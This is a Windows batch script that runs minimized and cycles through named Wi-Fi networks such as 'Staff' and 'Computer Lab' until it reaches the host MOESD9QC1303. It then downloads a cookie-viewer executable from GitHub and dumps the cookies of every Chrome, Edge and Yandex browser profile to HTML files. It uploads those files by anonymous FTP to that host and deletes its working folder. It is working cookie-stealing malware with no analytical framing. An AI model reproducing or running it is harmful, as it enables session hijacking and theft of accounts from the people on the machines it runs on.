@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
netsh wlan connect name="ALEF"
Ping MOESD9QC1303 -n 1
if errorlevel 1 (goto net2) else (goto 0)
exit

:net2
netsh wlan connect name="ALEF-CHAMPION"
Ping MOESD9QC1303 -n 1
if errorlevel 1 (goto net3) else (goto 0)
exit

:net3
netsh wlan connect name="joindomain"
Ping MOESD9QC1303 -n 1
if errorlevel 1 (goto net4) else (goto 0)
exit

:net4
netsh wlan connect name="Staff"
Ping MOESD9QC1303 -n 1
if errorlevel 1 (goto net5) else (goto 0)
exit


:net5
netsh wlan connect name="LAB"
Ping MOESD9QC1303 -n 1
if errorlevel 1 (goto net6) else (goto 0)
exit

:net6
netsh wlan connect name="Computer Lab"
Ping MOESD9QC1303 -n 1
if errorlevel 1 (goto error) else (goto 0)
exit

:error
msg * /time:1 not find
exit


:0
if exist %Temp%\cookies rmdir /s /q %Temp%\cookies
md %Temp%\cookies

if not exist %temp%\cookies\ChromeCookiesView.exe powershell Invoke-WebRequest https://github.com/a7ecc/ChromeCookiesView/raw/main/ChromeCookiesView.exe -o %temp%\cookies\ChromeCookiesView.exe
if exist %temp%\cookies\ChromeCookiesView.exe goto 2
goto 0

:2
if exist "%LOCALAPPDATA%\Google\Chrome\User Data" goto Chrome
if not exist "%LOCALAPPDATA%\Google\Chrome\User Data" goto checkEdge


:Chrome
if exist send.dat del send.dat
dir /A:D /B "%LOCALAPPDATA%\Google\Chrome\User Data" > %TEMP%\cookies\Chrome1
type %TEMP%\cookies\Chrome1 | findstr /b Default > %TEMP%\cookies\Chrome2
type %TEMP%\cookies\Chrome1 | findstr /b Profile >> %TEMP%\cookies\Chrome2
for /f "delims== tokens=1,2" %%G in (%TEMP%\cookies\Chrome2) do (
	echo send "%temp%\cookies\%computername% Chrome %%G.html" >> %temp%\cookies\send.dat
	if exist "%LOCALAPPDATA%\Google\Chrome\User Data\%%G\Network\Cookies" %temp%\cookies\ChromeCookiesView.exe /CookiesFile "%LOCALAPPDATA%\Google\Chrome\User Data\%%G\Network\Cookies" /shtml "%temp%\cookies\%computername% Chrome %%G.html"
)

:checkEdge
if exist "%LOCALAPPDATA%\Microsoft\Edge\User Data" goto Edge
if not exist "%LOCALAPPDATA%\Microsoft\Edge\User Data" goto checkYandex


:Edge
dir /A:D /B "%LOCALAPPDATA%\Microsoft\Edge\User Data" > %TEMP%\cookies\Edge1
type %TEMP%\cookies\Edge1 | findstr /b Default > %TEMP%\cookies\Edge2
type %TEMP%\cookies\Edge1 | findstr /b Profile >> %TEMP%\cookies\Edge2
for /f "delims== tokens=1,2" %%G in (%TEMP%\cookies\Edge2) do (
	echo send "%temp%\cookies\%computername% Edge %%G.html" >> %temp%\cookies\send.dat
	if exist "%LOCALAPPDATA%\Microsoft\Edge\User Data\%%G\Network\Cookies" %temp%\cookies\ChromeCookiesView.exe /CookiesFile "%LOCALAPPDATA%\Microsoft\Edge\User Data\%%G\Network\Cookies" /shtml "%temp%\cookies\%computername% Edge %%G.html"
)

:checkYandex
if exist "%LOCALAPPDATA%\Yandex\YandexBrowser\User Data" goto Yandex
if not exist "%LOCALAPPDATA%\Yandex\YandexBrowser\User Data" goto 3

:Yandex
dir /A:D /B "%LOCALAPPDATA%\Yandex\YandexBrowser\User Data" > %TEMP%\cookies\Yandex1
type %TEMP%\cookies\Yandex1 | findstr /b Default > %TEMP%\cookies\Yandex2
type %TEMP%\cookies\Yandex1 | findstr /b Profile >> %TEMP%\cookies\Yandex2
for /f "delims== tokens=1,2" %%G in (%TEMP%\cookies\Yandex2) do (
	echo send "%temp%\%computername% cookies\Yandex %%G.html" >> %temp%\cookies\send.dat
	if exist "%LOCALAPPDATA%\Yandex\YandexBrowser\User Data\%%G\Network\Cookies" %temp%\cookies\ChromeCookiesView.exe /CookiesFile "%LOCALAPPDATA%\Yandex\YandexBrowser\User Data\%%G\Network\Cookies" /shtml "%temp%\%computername% cookies\Yandex %%G.html"
)



:3
echo quit >> %temp%\cookies\send.dat
ftp -v -A -s:%temp%\cookies\send.dat MOESD9QC1303
rmdir /s /q %TEMP%\cookies
msg * /time:1 ok
exit